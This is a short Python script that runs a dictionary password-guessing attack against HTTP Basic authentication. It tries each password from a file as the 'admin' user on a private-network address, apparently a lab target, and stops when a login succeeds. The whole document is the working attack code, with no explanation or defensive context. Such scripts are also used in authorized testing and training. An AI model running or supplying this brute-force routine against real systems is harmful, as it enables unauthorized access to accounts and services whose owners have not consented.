#!/usr/bin/python3

import requests
from requests.auth import HTTPBasicAuth
with open('passwords.txt') as passwords:
    for password in passwords.readlines():
        password = password.strip()
        req = requests.get('http://10.0.3.8',auth=HTTPBasicAuth('admin', password))
        if req.status_code == 401:
            print (password, 'failed.')
        elif req.status_code == 200:
            print ('Login successful, password:', password)
            break
        else:
            print ('Error occurred with', password)
            break